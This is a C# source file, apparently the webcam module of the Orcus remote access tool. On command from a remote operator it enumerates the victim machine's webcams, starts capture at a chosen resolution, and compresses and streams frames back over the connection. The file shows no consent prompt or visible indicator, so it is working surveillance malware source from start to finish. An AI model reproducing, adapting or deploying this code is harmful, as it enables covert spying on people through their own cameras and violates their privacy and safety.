using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using AForge.Video.DirectShow;
using Orcus.Plugins;
using Orcus.Shared.Commands.Webcam;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;
using Orcus.Utilities;

namespace Orcus.Commands.Webcam
{
    internal class WebcamCommand : Command
    {
        private readonly object _framesLock = new object();
        private readonly object _unsafeStreamCodecLock = new object();
        private string _currentDevice;
        private int _currentResolution;
        private Bitmap _lastFrame;
        private AutoResetEvent _screenWaitEvent;
        private UnsafeStreamCodec _unsafeStreamCodec;
        private VideoCaptureDevice _videoCaptureDevice;
        private WebcamSettings _webcamSettings;
        private bool _isRunning;

        public override void Dispose()
        {
            lock (_framesLock)
            {
                _lastFrame?.Dispose();
                _lastFrame = null;
            }

            _videoCaptureDevice?.Stop();
            _unsafeStreamCodec?.Dispose();

            _unsafeStreamCodec = null;
            _videoCaptureDevice = null;
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((WebcamCommunication) parameter[0])
            {
                case WebcamCommunication.Start:
                    _webcamSettings = new Serializer(typeof(WebcamSettings)).Deserialize<WebcamSettings>(parameter, 1);

                    if (_videoCaptureDevice != null && _videoCaptureDevice.Source != _webcamSettings.MonikerString)
                    {
                        _videoCaptureDevice.Stop();
                        _videoCaptureDevice = null;
                    }

                    if (_videoCaptureDevice == null)
                        _videoCaptureDevice = new VideoCaptureDevice(_webcamSettings.MonikerString);

                    try
                    {
                        _videoCaptureDevice.VideoResolution =
                            _videoCaptureDevice.VideoCapabilities[_webcamSettings.Resolution];
                    }
                    catch (Exception)
                    {
                        ResponseByte((byte) WebcamCommunication.ResponseResolutionNotFoundUsingDefault, connectionInfo);
                    }

                    _isRunning = true;

                    _videoCaptureDevice.NewFrame += _videoCaptureDevice_NewFrame;
                    _videoCaptureDevice.Start();

                    ResponseByte((byte) WebcamCommunication.ResponseStarted, connectionInfo);
                    break;
                case WebcamCommunication.Stop:
                    if (_videoCaptureDevice != null)
                    {
                        _videoCaptureDevice.NewFrame -= _videoCaptureDevice_NewFrame;
                        _videoCaptureDevice.Stop();
                        _isRunning = false;

                        lock (_unsafeStreamCodecLock)
                        {
                            _unsafeStreamCodec?.Dispose();
                            _unsafeStreamCodec = null;
                        }

                        _videoCaptureDevice = null;

                        lock (_framesLock)
                        {
                            _lastFrame?.Dispose();
                            _lastFrame = null;
                        }

                        ResponseByte((byte) WebcamCommunication.ResponseStopped, connectionInfo);
                    }
                    break;
                case WebcamCommunication.GetImage:
                    if (_lastFrame == null)
                    {
                        if (!_isRunning)
                            return;

                        _screenWaitEvent?.Close();
                        _screenWaitEvent = new AutoResetEvent(false);
                        if (!_screenWaitEvent.WaitOne(10000, false))
                        {
                            if (!_isRunning)
                                return;

                            ResponseByte((byte) WebcamCommunication.ResponseNoFrameReceived, connectionInfo);
                            _videoCaptureDevice.NewFrame -= _videoCaptureDevice_NewFrame;
                            _videoCaptureDevice.Stop();
                            _unsafeStreamCodec?.Dispose();

                            _unsafeStreamCodec = null;
                            _videoCaptureDevice = null;
                            return;
                        }
                    }

                    if (!_isRunning)
                        return;

                    lock (_unsafeStreamCodecLock)
                    {
                        if (!_isRunning)
                            return;

                        if (_unsafeStreamCodec != null &&
                            (_currentResolution != _webcamSettings.Resolution ||
                             _currentDevice != _webcamSettings.MonikerString))
                        {
                            _unsafeStreamCodec.Dispose();
                            _unsafeStreamCodec = null;
                        }

                        if (_unsafeStreamCodec == null)
                        {
                            _currentResolution = _webcamSettings.Resolution;
                            _currentDevice = _webcamSettings.MonikerString;
                            _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None)
                            {
                                ImageQuality = parameter[1]
                            };
                        }

                        IDataInfo dataInfo;
                        lock (_framesLock)
                        {
                            var webcamData =
                                _lastFrame.LockBits(new Rectangle(0, 0, _lastFrame.Width, _lastFrame.Height),
                                    ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);

                            dataInfo = _unsafeStreamCodec.CodeImage(webcamData.Scan0,
                                new Rectangle(0, 0, webcamData.Width, webcamData.Height),
                                new Size(_lastFrame.Width, _lastFrame.Height), webcamData.PixelFormat);
                            _lastFrame.UnlockBits(webcamData);
                        }

                        connectionInfo.UnsafeResponse(this, dataInfo.Length + 1, writer =>
                        {
                            writer.Write((byte) WebcamCommunication.ResponseFrame);
                            dataInfo.WriteIntoStream(writer.BaseStream);
                        });
                    }
                    break;
                case WebcamCommunication.GetWebcams:
                    if (CoreHelper.RunningOnVistaOrGreater)
                    {
                        var webcams =
                            new FilterInfoCollection(FilterCategory.VideoInputDevice).OfType<FilterInfo>()
                                .Select(
                                    x =>
                                        new WebcamInfo
                                        {
                                            MonikerString = x.MonikerString,
                                            Name = x.Name,
                                            AvailableResolutions =
                                                new VideoCaptureDevice(x.MonikerString).VideoCapabilities.Select(
                                                    y =>
                                                        new WebcamResolution
                                                        {
                                                            Width = y.FrameSize.Width,
                                                            Heigth = y.FrameSize.Height
                                                        }).ToList()
                                        })
                                .ToList();
                        ResponseBytes((byte) WebcamCommunication.ResponseWebcams,
                            new Serializer(typeof(List<WebcamInfo>)).Serialize(webcams), connectionInfo);
                    }
                    else
                    {
                        ResponseByte((byte) WebcamCommunication.ResponseNotSupported, connectionInfo);
                    }

                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void _videoCaptureDevice_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            lock (_framesLock)
            {
                _lastFrame?.Dispose();
                _lastFrame = (Bitmap) eventArgs.Frame.Clone();
            }
            _screenWaitEvent?.Set();
        }

        protected override uint GetId()
        {
            return 18;
        }
    }
}